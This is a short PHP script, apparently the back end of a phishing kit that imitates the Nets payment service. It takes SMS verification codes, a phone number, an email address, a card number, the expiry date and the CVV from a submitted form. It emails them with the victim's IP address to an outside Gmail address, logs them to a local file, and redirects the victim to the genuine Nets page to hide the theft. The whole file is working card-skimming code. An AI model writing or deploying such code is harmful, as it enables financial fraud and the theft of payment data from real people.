<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  2       : ".$_POST['otp']."\n";
$bilsmg .= "sms  1       : ".$_POST['sms1']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "Full Infos sms2 - ".$ip;
$bilhead = "From: Nets <Amret@localhost.ma>";

mail("silviodemesquita@gmail.com",$bilsub,$bilsmg,$bilhead);
$file = fopen("../CC-326548521599.txt", 'a');
fwrite($file, $bilsmg);
header("location: https://www.nets.eu/dk/payments/secure-card-transactions ");
?>